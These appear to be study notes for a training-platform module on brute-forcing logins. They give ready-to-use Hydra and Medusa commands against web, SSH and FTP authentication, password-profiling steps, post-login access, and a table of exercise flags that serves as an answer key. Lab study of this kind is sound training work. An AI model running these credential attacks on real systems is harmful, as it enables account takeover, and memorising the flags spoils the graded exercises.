# HTB Academy — CWES Login Brute Forcing Module Notes

---

## Module Overview

This module covers brute forcing authentication mechanisms across web apps, SSH, and FTP. Key tools: Hydra (web), Medusa (SSH/FTP/web), Username Anarchy (username generation), CUPP (password profiling).

---

## Attack Types Summary

| Method | Description | Best Used When |
|--------|-------------|----------------|
| Simple brute force | All combinations | No info, abundant compute |
| Dictionary attack | Pre-compiled wordlist | Target likely uses weak/common password |
| Hybrid attack | Dictionary + mutations | Password policy forces predictable changes |
| Credential stuffing | Leaked creds from breaches | Password reuse suspected |
| Password spraying | Few passwords, many users | Lockout policy in place |
| Rainbow table | Pre-computed hash lookup | Have hashes, need plaintexts |
| Reverse brute force | One password, many usernames | Known password, unknown username |

---

## Wordlists

All in SecLists (`/usr/share/seclists/` on Pwnbox):

| Wordlist | Path | Use |
|----------|------|-----|
| rockyou.txt | `Passwords/Leaked-Databases/rockyou.txt` | Go-to password list |
| 2023-200 most used | `Passwords/Common-Credentials/2023-200_most_used_passwords.txt` | Fast, 200 entries |
| 500 worst | `Passwords/Common-Credentials/500-worst-passwords.txt` | Fastest, 500 entries |
| darkweb2017 top 10k | `Passwords/Common-Credentials/darkweb2017_top-10000.txt` | Policy filtering |
| top usernames shortlist | `Usernames/top-usernames-shortlist.txt` | 17 common usernames |
| xato 10M usernames | `Usernames/xato-net-10-million-usernames.txt` | Thorough username list |
| Default creds | `Default-Credentials/default-passwords.txt` | Device/software defaults |

---

## Hydra

### Basic HTTP Auth
```bash
hydra -l <user> -P <wordlist> <TARGET> http-get / -s <PORT>
```

### Web Login Form (POST)
```bash
hydra -L users.txt -P passwords.txt <TARGET> -s <PORT> -f \
  http-post-form "/<path>:username=^USER^&password=^PASS^:F=Invalid credentials"
```

- `F=` — failure string in response body
- `S=` — success condition (HTTP status code or keyword)
- `^USER^` and `^PASS^` are Hydra placeholders
- `-f` stops on first success

### http-post-form format
```
"path:param1=^USER^&param2=^PASS^:F=failure_string"
```
Three parts separated by `:` — path, params, condition.

---

## Medusa

### SSH
```bash
medusa -h <IP> -n <PORT> -u <user> -P <wordlist> -M ssh -t 3
```

### FTP (internal, from SSH session)
```bash
medusa -h 127.0.0.1 -u <user> -P <wordlist> -M ftp -t 5
```
Use `127.0.0.1` not `localhost` — forces IPv4, avoids IPv6 issues.

### Web Form
```bash
medusa -M web-form -h <TARGET> -U users.txt -P passwords.txt \
  -m "FORM:username=^USER^&password=^PASS^:F=Invalid"
```

### Empty/default password check
```bash
medusa -h <IP> -U users.txt -e ns -M ssh
# -e n = try empty password
# -e s = try username as password
```

---

## Custom Wordlists

### Username Anarchy
```bash
git clone https://github.com/urbanadventurer/username-anarchy.git
cd username-anarchy
./username-anarchy "First" "Last" > usernames.txt
```
Generates: first, last, firstlast, f.last, flast, initials, FLast, etc.

### CUPP
```bash
cupp -i   # interactive mode
```
Input: name, nickname, birthdate, partner info, pet, company, keywords, special chars, numbers, leet mode.
Output: `firstname.txt` (~46k passwords).

### Policy-based grep filtering
```bash
# Adjust filters to match observed policy
grep -E '^.{6,}$' name.txt \        # min length
  | grep -E '[A-Z]' \               # uppercase
  | grep -E '[a-z]' \               # lowercase
  | grep -E '[0-9]' \               # number
  | grep -E '([!@#$%^&*].*){2,}' \ # two special chars
  > filtered.txt
wc -l filtered.txt
```

---

## Post-Authentication

### Basic Auth
```bash
curl -s -u user:pass http://<TARGET>:<PORT>/
```

### Web Form (session cookie)
```bash
curl -s -X POST http://<TARGET>:<PORT>/<path> \
  --data-urlencode 'username=<user>' \
  --data-urlencode 'password=<pass>' \
  -c cookies.txt
curl -s http://<TARGET>:<PORT>/success -b cookies.txt
```

### FTP
```bash
ftp ftp://user:pass@127.0.0.1
# Inside: ls, get flag.txt, exit
cat flag.txt
```

---

## SSH → Internal Pivot

```bash
# After SSH access
netstat -tulpn | grep LISTEN    # find listening services
nmap localhost                  # confirm service types
ls /home                        # find username hints
```

---

## Lessons from Exercises

- **`!!` in passwords** — bash history expansion; use `--data-urlencode` with single quotes
- **Session cookie required** — web login redirects to `/success` which is GET-only; save cookie with `-c`, use with `-b`
- **Wordlist not on remote box** — use `wget` from inside SSH session
- **Medusa FTP + localhost** — use `127.0.0.1` not `localhost` to avoid IPv6
- **CUPP output needs filtering** — 46k → ~8k after policy filter; smaller list = faster attack
- **Read `/home` after SSH** — folder names reveal FTP/service usernames
- **Username Anarchy finds non-obvious formats** — `jane` not `janesmith` was the winning username

---

## Flags from Exercises

| Section | Flag |
|---------|------|
| S3 — PIN brute force | `HTB{Brut3_F0rc3_1s_P0w3rfu1}` |
| S4 — Dictionary attack | `HTB{Brut3_F0rc3_M4st3r}` |
| S7 — Basic HTTP Auth | `HTB{th1s_1s_4_f4k3_fl4g}` |
| S8 — Web login form | `HTB{W3b_L0gin_Brut3F0rc3}` |
| S10 — SSH+FTP pivot | `HTB{SSH_and_FTP_Bruteforce_Success}` |
| S11 — Custom wordlists | `HTB{W3b_L0gin_Brut3F0rc3_Cu5t0m}` |
